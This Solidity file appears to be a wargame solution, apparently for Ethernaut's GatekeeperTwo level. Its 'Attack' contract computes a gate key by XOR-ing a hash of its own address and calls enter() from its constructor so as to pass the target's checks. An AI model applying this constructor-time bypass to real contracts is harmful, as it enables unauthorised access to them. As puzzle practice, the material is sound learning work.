// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperTwo.sol";

contract Attack {
    GatekeeperTwo gatekeeper;
    address public owner;
    uint64 public one;
    uint64 public two;
    bytes8 public gateKey;
    bool public entered;

    constructor(address payable _gatekeeper) public {
        gatekeeper = GatekeeperTwo(_gatekeeper);
        owner = msg.sender;
        one = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        two = one ^ (uint64(0) - 1);
        gateKey = bytes8(two);
        entered = gatekeeper.enter(gateKey);
    }
}
